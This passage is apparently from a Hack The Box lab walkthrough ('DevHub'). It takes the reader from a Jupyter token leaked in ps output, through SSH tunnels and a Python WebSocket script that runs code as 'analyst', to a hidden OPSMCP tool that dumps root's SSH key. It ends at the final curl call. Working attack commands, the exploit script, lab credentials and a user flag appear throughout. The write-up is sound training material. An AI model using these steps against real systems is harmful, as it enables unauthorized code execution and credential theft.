root         308  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_24]
root         309  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_24]
root         310  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_25]
root         311  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_25]
root         312  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_26]
root         313  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_26]
root         314  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_27]
root         315  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_27]
root         316  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_28]
root         317  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_28]
root         318  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_29]
root         319  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_29]
root         320  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_30]
root         321  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_30]
root         322  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_31]
root         323  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_31]
root         351  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_32]
root         352  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_32]
root         380  0.0  0.0      0     0 ?        I<   05:00   0:00 [kdmflush]
root         406  0.0  0.0      0     0 ?        I<   05:00   0:00 [raid5wq]
root         454  0.0  0.0      0     0 ?        S    05:00   0:00 [jbd2/dm-0-8]
root         455  0.0  0.0      0     0 ?        I<   05:00   0:00 [ext4-rsv-conver]
root         515  0.0  1.7 126292 68212 ?        S<s  05:00   0:03 /lib/systemd/systemd-journald
root         543  0.0  0.0      0     0 ?        I<   05:01   0:00 [kaluad]
root         547  0.0  0.0      0     0 ?        I<   05:01   0:00 [kmpath_rdacd]
root         548  0.0  0.0      0     0 ?        I<   05:01   0:00 [kmpathd]
root         550  0.0  0.0      0     0 ?        I<   05:01   0:00 [kmpath_handlerd]
root         551  0.0  0.6 289456 27236 ?        SLsl 05:01   0:02 /sbin/multipathd -d -s
root         555  0.0  0.1  26836  7752 ?        Ss   05:01   0:00 /lib/systemd/systemd-udevd
root         673  0.0  0.0      0     0 ?        S    05:01   0:00 [jbd2/sda2-8]
root         675  0.0  0.0      0     0 ?        I<   05:01   0:00 [ext4-rsv-conver]
systemd+     730  0.0  0.3  26340 13268 ?        Ss   05:01   0:00 /lib/systemd/systemd-resolved
systemd+     734  0.0  0.1  89364  6584 ?        Ssl  05:01   0:01 /lib/systemd/systemd-timesyncd
root         753  0.0  0.0  85380  2508 ?        S<sl 05:01   0:01 /sbin/auditd
_laurel      758  0.0  0.1   9992  6120 ?        S<   05:01   0:02 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         801  0.0  0.2  51160 11876 ?        Ss   05:01   0:00 /usr/bin/VGAuthService
root         802  0.1  0.2 242348 10200 ?        Ssl  05:01   0:28 /usr/bin/vmtoolsd
root         813  0.0  0.0      0     0 ?        S    05:01   0:00 [audit_prune_tre]
root         852  0.0  0.1 101244  5900 ?        Ssl  05:01   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     891  0.0  0.1   8804  4768 ?        Ss   05:01   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         896  0.0  0.0  82840  3852 ?        Ssl  05:01   0:01 /usr/sbin/irqbalance --foreground
root         897  0.0  0.4  32728 19652 ?        Ss   05:01   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         898  0.0  0.1 234512  6804 ?        Ssl  05:01   0:00 /usr/libexec/polkitd --no-debug
syslog       899  0.0  0.1 222404  5632 ?        Ssl  05:01   0:00 /usr/sbin/rsyslogd -n -iNONE
root         901  0.0  0.8 1326808 35996 ?       Ssl  05:01   0:02 /usr/lib/snapd/snapd
root         903  0.0  0.1  15368  7432 ?        Ss   05:01   0:00 /lib/systemd/systemd-logind
root         904  0.0  0.3 392628 12820 ?        Ssl  05:01   0:00 /usr/libexec/udisks2/udisksd
root         928  0.0  0.3 317980 12076 ?        Ssl  05:01   0:00 /usr/sbin/ModemManager
analyst     1054  0.0  2.4 182524 96588 ?        Ss   05:01   0:07 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
mcp-dev     1056  0.0  1.8 1720736 74312 ?       Ssl  05:01   0:01 npm start
root        1059  0.0  0.0   6896  2864 ?        Ss   05:01   0:00 /usr/sbin/cron -f -P
root        1061  0.0  0.7  37376 28796 ?        Ss   05:01   0:05 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
root        1073  0.0  0.0   6176  1120 tty1     Ss+  05:01   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1081  0.0  0.2  15440  8684 ?        Ss   05:01   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1118  0.0  0.0  55240  1676 ?        Ss   05:01   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1119  0.0  0.1  55872  5456 ?        S    05:01   0:00 nginx: worker process
www-data    1120  0.0  0.1  55872  5456 ?        S    05:01   0:00 nginx: worker process
mcp-dev     1253  0.0  0.0   2892   940 ?        S    05:01   0:00 sh -c npx @mcpjam/inspector@1.4.2
mcp-dev     1254  0.0  2.4 1738648 96964 ?       Sl   05:01   0:04 npm exec @mcpjam/inspector@1.4.2
mcp-dev     1270  0.0  0.0   2892   960 ?        S    05:01   0:00 sh -c "inspector"
mcp-dev     1271  0.0  1.3 1441876 52164 ?       Sl   05:01   0:00 node /opt/mcpjam/node_modules/.bin/inspector
mcp-dev     1290  0.0  3.5 2225328 142716 ?      Sl   05:01   0:03 node /opt/mcpjam/node_modules/@mcpjam/inspector/dist/server/index.js
root        1403  0.0  0.0      0     0 ?        I    05:15   0:09 [kworker/0:2-events]
root        1592  0.0  0.0      0     0 ?        I    06:16   0:07 [kworker/1:2-events_freezable]
mcp-dev     1613  0.0  0.1   8916  5092 ?        S    06:19   0:00 /bin/bash -i
root        1722  0.0  0.0      0     0 ?        I    07:48   0:00 [kworker/u4:2-events_unbound]
root        1763  0.0  0.0      0     0 ?        I    08:22   0:00 [kworker/u4:1-events_power_efficient]
root        1789  0.0  0.2  16924 10688 ?        Ss   08:42   0:00 sshd: mcp-dev [priv]
mcp-dev     1792  0.0  0.2  17192  9708 ?        Ss   08:42   0:00 /lib/systemd/systemd --user
mcp-dev     1793  0.0  0.0 169352  3908 ?        S    08:42   0:00 (sd-pam)
root        1795  0.0  0.0      0     0 ?        I    08:42   0:00 [kworker/1:0-events]
mcp-dev     1898  0.0  0.2  17216  8020 ?        S    08:42   0:00 sshd: mcp-dev@pts/0
mcp-dev     1901  0.0  0.1   8660  5472 pts/0    Ss   08:42   0:00 -bash
root        1941  0.0  0.0      0     0 ?        I    08:54   0:00 [kworker/u4:0-events_unbound]
mcp-dev     1981  0.0  0.0  10072  1568 pts/0    R+   09:27   0:00 ps auxww
```

**Key findings:** Two critical discoveries in one command:

1. **Jupyter token leaked in plaintext:** `--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` — passed as a CLI argument, visible to any user with `ps` access.
	- Why this is exploitable:
		- On Linux, a process's full command line — including every argument passed to it — is stored in `/proc/<pid>/cmdline` and is world-readable via `ps aux` by any user on the system, regardless of who owns the process.
		- Jupyter's `--ServerApp.token` flag is the authentication secret for its REST and WebSocket API. Anyone with this token can authenticate to Jupyter as analyst and execute arbitrary Python code through it — equivalent to a shell as analyst.
		- This is a textbook example of a secrets-in-process-arguments leak: a developer started Jupyter with the token as a CLI flag (convenient for scripting/automation) without realizing every other user on the box can read it.
	
2. **OPSMCP runs as root:** PID 1061, launched by root — any code it executes runs with full system privileges.
	- This is the same custom Flask service we fingerprinted earlier via SSRF on localhost:5000 ("OPSMCP" with X-API-Key auth). Crucially, it's running as root, not as a service account or as analyst.
	- Why this matters: anything this script does — opening files, running commands — happens with root privileges. If we can get it to do something useful for us (like read a root-owned file), we inherit that privilege. This is our target for the privesc stage.

Save the token for later use.

This is a classic process argument credential leak. Jupyter's `--ServerApp.token` flag is passed on the command line rather than being read from an environment variable or config file, making it visible to all local users via `/proc/<pid>/cmdline` and `ps aux`.

Before using the Jupyter token, let's confirm what's blocking direct access to the analyst user's files, and set up SSH tunnels to reach both `localhost:8888 `(Jupyter) and `localhost:5000` (OPSMCP) from your Kali machine.

First, quick check — try to access the analyst home directory directly:

```bash
ls -la /home/
ls -la /home/analyst/
```

This confirms why we need the Jupyter pivot rather than just cd-ing into analyst's files.

**Result:**

```shell
mcp-dev@devhub:~$ ls -la /home/
total 16
drwxr-xr-x  4 root    root    4096 Mar 16 21:25 .
drwxr-xr-x 20 root    root    4096 May 27 12:14 ..
drwxr-x---  9 analyst analyst 4096 May 27 12:22 analyst
drwxr-x---  5 mcp-dev mcp-dev 4096 Jun 10 08:23 mcp-dev
mcp-dev@devhub:~$ ls -la /home/analyst/
ls: cannot open directory '/home/analyst/': Permission denied
```

This output explains exactly why we need the pivot.

`drwxr-x---  9 analyst analyst 4096 May 27 12:22 analyst`

Breaking down those permissions (`drwxr-x---`):

- `d` — it's a directory
- `rwx` (owner) — analyst can read/write/execute (enter) this directory
- `r-x` (group) — members of the analyst group can read/enter
- `---` (others) — everyone else gets nothing

You're mcp-dev, in the mcp-dev group — neither the owner nor in the analyst group. So Permission denied is expected and correct. There's no misconfiguration here to exploit directly; this is properly locked down. The only way in is to become analyst — which is exactly what the leaked Jupyter token gives us.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 SSH Port Forwarding — Tunnel to Internal Services(Jupyter (8888) and OPSMCP (5000))

Both services are bound to `127.0.0.1` on the target — meaning they only accept connections from the target itself, not from your Kali machine. SSH local port forwarding lets us "borrow" the SSH connection to reach those ports as if they were local to us.

Run this on your Kali machine (new terminal, separate from your existing SSH session):

**Command:** `ssh -i /tmp/devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@TARGET_IP -fN`

**Breakdown:**

- `ssh -i /tmp/devhub_key`
  - Description: Connect via SSH using our private key, as before.
  - Purpose: Authenticates as mcp-dev without a password.
- `-L 18888:127.0.0.1:8888`
  - Description: Local port forward — format is -L <local_port>:<destination_host>:<destination_port>. Anything sent to your Kali machine's localhost:18888 gets tunneled through SSH and delivered to 127.0.0.1:8888 from the target's perspective.
  - Purpose: Gives us access to Jupyter (port 8888 on the target) via localhost:18888 on Kali. We use 18888 instead of 8888 to avoid colliding with anything already running locally on your Kali box.
- `-L 15000:127.0.0.1:5000`
  - Description: A second local forward, same syntax, for OPSMCP on port 5000.
  - Purpose: Gives us access to OPSMCP via localhost:15000 on Kali — needed for the privesc stage later.
- `-N`
  - Description: "No remote command" — tells SSH not to execute anything on the remote shell, just set up the forwarding.
  - Purpose: We only want the tunnel, not an interactive session. The terminal will appear to hang/do nothing — this is correct, leave it running.
- `-f`
  - Description: "Fork into background" — SSH goes to background after authentication, instead of occupying your terminal.
  - Purpose: Frees up your terminal immediately so you don't need a separate window just to keep the tunnel alive.

Note: `-f` requires `-N` (or a remote command) to be specified — SSH refuses -f on its own because it wouldn't know what to do once backgrounded. That's why they're combined as `-fN`.

Since it's now a background process, if you want to kill the tunnel later you'll need to find and kill it manually:

```bash
ps aux | grep "ssh -i /tmp/devhub_key"
kill <PID>
```

Or just let it run — it's harmless to leave open for the rest of the engagement.

Tunnel verification:

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ curl -s http://localhost:18888/api
{"version": "2.17.0"}     

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ curl -s http://localhost:15000/health
{"status":"healthy","uptime":"14d 3h 22m"}
```

Both tunnels are working perfectly and their services are now accessible locally on our attacker machine.

- `curl -s http://localhost:18888/api`
  - Sends a request to your Kali machine's port 18888
  - The SSH tunnel intercepts it and forwards it through the encrypted SSH connection to the target's `127.0.0.1:8888`
  - On the target, that's Jupyter's /api endpoint, which returns its version info
  - Getting back {"version": "2.17.0"} proves the full path works: Kali → SSH tunnel → target's localhost → Jupyter → response back to Kali
- `curl -s http://localhost:15000/health`
  - Same idea, but forwards to the target's 127.0.0.1:5000 — OPSMCP's /health endpoint
  - Getting back {"status":"healthy",...} confirms that tunnel works too

If either had failed (connection refused, timeout, empty response), it would mean the tunnel wasn't set up correctly — better to catch that now than after typing out a long Jupyter API command and getting a confusing error.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Jupyter Code Execution as `analyst`

Jupyter's REST API doesn't execute code directly — it's used for lifecycle management (creating/listing/deleting kernels and notebooks). A "kernel" is the actual Python process that runs code. We need to create one first, then connect to it via WebSocket (next step) to actually run commands.

With the Jupyter token and a local tunnel established, the Jupyter REST API was used to spawn a kernel and execute Python code in the context of the `analyst` user.

**Theory Block — Jupyter Kernel Code Execution:**
Jupyter's REST API allows creating compute kernels and then communicating with them via WebSocket using the Jupyter messaging protocol. A kernel is an isolated Python interpreter process owned by the user who launched Jupyter (in this case, `analyst`). By creating a kernel and sending `execute_request` messages over the WebSocket, any code executed runs as `analyst` — including reading files owned by that user and those readable by `analyst`'s group.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 4.4.1 Step 1 — Create a kernel:

**Command:** 

```bash
TOKEN="a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"

curl -s -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"python3"}' \
  http://localhost:18888/api/kernels
```

**Breakdown:**

- `TOKEN="a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"`
	- Description: Stores the leaked token (from `ps auxww`) in a shell variable.
	- Purpose: Avoids retyping the long string and reduces risk of typos in the next several commands that all need it.
- `-X POST`
	- Description: Sends an HTTP POST request instead of the default GET.
	- Purpose: Creating a new kernel is a state-changing operation — Jupyter's API requires POST for this endpoint.
- `-H "Authorization: token $TOKEN"`
	- Description: Sets the Authorization HTTP header using Jupyter's specific token `<value>` scheme (not the more common Bearer `<value>`).
	- Purpose: This is the authentication step — without a valid token, Jupyter rejects the request with a 403. This is the credential we extracted from the process table.
- `-H "Content-Type: application/json"`
	- Description: Tells the server the request body is JSON-formatted.
	- Purpose: Jupyter's API expects JSON; without this header it may reject or misinterpret the body.
- `-d '{"name":"python3"}'`
	- Description: The JSON request body — specifies which kernel "kernelspec" to launch.
	- Purpose: python3 is the standard Python kernel. This tells Jupyter to spawn a new Python interpreter process that we'll send code to.
- `http://localhost:18888/api/kernels`
	- Description: The Jupyter REST endpoint for kernel management.
	- Purpose: POSTing here creates a new kernel; GETing here would list existing kernels.

**Result:**

```shell
curl -s -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"python3"}' \
  http://localhost:18888/api/kernels
{"id": "43e96841-8b17-4c27-bf04-987bd7f206f8", "name": "python3", "last_activity": "2026-06-10T11:43:18.372887Z", "execution_state": "starting", "connections": 0}  
```

Kernel created successfully — id: `43e96841-8b17-4c27-bf04-987bd7f206f8`. Save that, you'll need it for the next step.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 4.4.2 Step 2 — Execute code via Jupyter's WebSocket protocol:

Here's why this is a separate step from kernel creation:

Jupyter splits its API into two parts:

- REST API (/api/kernels) — lifecycle management only: create, list, delete kernels.
- WebSocket API (/api/kernels/{id}/channels) — the actual code execution channel

You can't just POST code to a REST endpoint and get a result back. Instead, you open a persistent WebSocket connection to the kernel's "channels" endpoint and speak the Jupyter Messaging Protocol — a structured JSON message format where you send an execute_request message and listen for stream/execute_reply messages containing the output.

This requires a script rather than a single `curl` command, since `curl` doesn't handle WebSockets well for this kind of bidirectional protocol exchange.

First, check if websocket-client is installed on Kali:

`python3 -c "import websocket" 2>/dev/null && echo "installed" || echo "missing"`

If missing:

`pip3 install websocket-client`

Create the file `jupyter_exec.py` in your working directory:

```python
import json, uuid, time, threading, websocket

TOKEN     = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "43e96841-8b17-4c27-bf04-987bd7f206f8"

CODE = """
import os
print("=== id ===")
print(os.popen("id").read().strip())
print("\\n=== USER FLAG ===")
try:
    print(open('/home/analyst/user.txt').read().strip())
except Exception as e:
    print(f"ERROR: {e}")
print("\\n=== /opt/opsmcp/server.py ===")
try:
    print(open('/opt/opsmcp/server.py').read())
except Exception as e:
    print(f"ERROR: {e}")
"""

collected = []
done      = threading.Event()
MSG_ID    = str(uuid.uuid4())

def on_message(ws, raw):
    msg      = json.loads(raw)
    msg_type = msg.get("header", {}).get("msg_type", "")
    parent   = msg.get("parent_header", {}).get("msg_id", "")

    if msg_type == "stream" and parent == MSG_ID:
        collected.append(msg["content"]["text"])
    elif msg_type == "error" and parent == MSG_ID:
        for line in msg["content"]["traceback"]:
            collected.append(line + "\n")
    elif msg_type == "execute_reply" and parent == MSG_ID:
        time.sleep(0.3)
        done.set()

def on_open(ws):
    print("[*] Connected — waiting 2s for kernel ready state...")
    time.sleep(2)
    print("[*] Sending execute_request...")
    ws.send(json.dumps({
        "header": {
            "msg_id":   MSG_ID,
            "username": "attacker",
            "session":  str(uuid.uuid4()),
            "msg_type": "execute_request",
            "version":  "5.3"
        },
        "parent_header": {},
        "metadata":      {},
        "content": {
            "code":             CODE,
            "silent":           False,
            "store_history":    False,
            "user_expressions": {},
            "allow_stdin":      False
        },
        "channel": "shell"
    }))

def on_error(ws, err):
    print(f"[!] WS error: {err}")
    done.set()

ws = websocket.WebSocketApp(
    f"ws://localhost:18888/api/kernels/{KERNEL_ID}/channels",
    header={"Authorization": f"token {TOKEN}"},
    on_message=on_message,
    on_open=on_open,
    on_error=on_error
)

t = threading.Thread(target=ws.run_forever)
t.daemon = True
t.start()

if done.wait(timeout=30):
    ws.close()
    print("".join(collected))
    print("[*] Done.")
else:
    ws.close()
    print("[!] Timed out — partial output:")
    print("".join(collected))
```

**Quick conceptual breakdown before you run it:**






**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ python3 jupyter_exec.py                                                        
[*] Connected — waiting 2s for kernel ready state...
[*] Sending execute_request...
=== id ===
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)

=== USER FLAG ===
21aae6fc453576f22fd0faa797880a9a

=== /opt/opsmcp/server.py ===
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)


[*] Done.
```

Let's break down what we just got:

1. **USER FLAG:** `21aae6fc453576f22fd0faa797880a9a`
	This is analyst's user.txt. ✅ First flag done.
	
2. Full OPSMCP source code — three critical discoveries
	1. The API key:
		VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
		This is what the /tools/call endpoint checks via the X-API-Key header. We now have valid credentials to call OPSMCP — which, remember, runs as root.
	2. Hidden tools that don't appear in /tools/list:
```
HIDDEN_TOOLS = {
	"ops._admin_dump": {...},
	"ops._debug_mode": {...}
}
ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
```

2. 
	2. (...continuation) The /tools/list endpoint only returns VISIBLE_TOOLS. But /tools/call checks against ALL_TOOLS — which includes the hidden ones. This means ops._admin_dump is callable even though no normal enumeration would reveal it exists. You'd only know about it by reading the source — which we just did.
	3. What `ops._admin_dump` does:

```
if target == "ssh_keys":
    with open('/root/.ssh/id_rsa', 'r') as f:
        key_data = f.read()
    return jsonify({"root_private_key": key_data, ...})
```

2. 
	3. (...continuation) Since `server.py` runs as root (confirmed earlier via `ps auxww`), open('/root/.ssh/id_rsa', 'r') succeeds — root can read its own SSH private key. The endpoint then hands that key back to us in the JSON response.
		- This is a "break glass" emergency recovery feature that was never meant to be reachable by untrusted users — but since OPSMCP has no concept of who is calling it (just a static API key check), anyone with the key gets root's private key.


Looking at that block again:

```python
elif target == "passwords":
    return jsonify({
        "target": "passwords",
        "dump": {
            "root": "$6$rounds=656000$saltsalt$hashedpassword",
            "analyst": "JupyterN0tebook!2026",
            "mcp-dev": "Mcp!Insp3ct0r2026"
        }
    })
```

The root entry is almost certainly fake/decoy:

`$6$rounds=656000$saltsalt$hashedpassword`

This is the format of a SHA-512 shadow hash ($6$ = SHA-512, rounds=656000 = cost factor, then salt, then hash) — but the salt literally says `saltsalt` and the hash literally says `hashedpassword`. Real hashes are random-looking base64-style strings of ~86 characters. This is a placeholder that was never actually generated — it's not a crackable real hash, it's a hardcoded string that looks like one.

Even if it were real, a hash isn't directly usable — you'd need to crack it offline with hashcat/john, which could take forever depending on complexity.

The analyst and mcp-dev passwords are plaintext and could theoretically be real:

analyst: `JupyterN0tebook!2026`
mcp-dev: `Mcp!Insp3ct0r2026`

These could be tested — e.g., `su analyst` from your mcp-dev shell, or SSH login as analyst. They might work, or they might be distractions designed to look tempting but lead nowhere (since we already have a cleaner path to root via the SSH key).

Why we're not pursuing this path:

1. We already have a direct, route to root — target: "ssh_keys" hands us root's actual private key, no cracking or guessing required
2. The "passwords" branch gives us at best analyst (which we already have via Jupyter) or mcp-dev (which we already have)
3. Spending time testing potentially-fake credentials when a working exploit path exists is a detour

If you're curious for learning purposes, you could test the analyst password as a side exercise after we get root — but for the main attack chain, ssh_keys was my intended path. Let's continue with that.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

### 5.1 Call `ops._admin_dump` via the OPSMCP tunnel (port 15000)

```bash
curl -s http://localhost:15000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Breakdown:

- `http://localhost:15000/tools/call`
	- Description: The tunneled OPSMCP endpoint that executes a named tool.
	- Purpose: 15000 → tunnel → target's 127.0.0.1:5000/tools/call, where server.py (running as root) processes the request.
- `-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"`
	- Description: Sets the custom auth header check_auth() checks for.
	- Purpose: Without this, every /tools/call request returns 401 Unauthorized. We extracted this exact value from the source code.
- `-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'`
	- Description: JSON body specifying which tool to call and its arguments.
	- Purpose: name selects the hidden `ops._admin_dump` tool from ALL_TOOLS. target: "ssh_keys" selects the branch that reads `/root/.ssh/id_rsa`. confirm: true is required — the code returns a warning instead of executing if confirm is false/missing.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ curl -s http://localhost:15000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
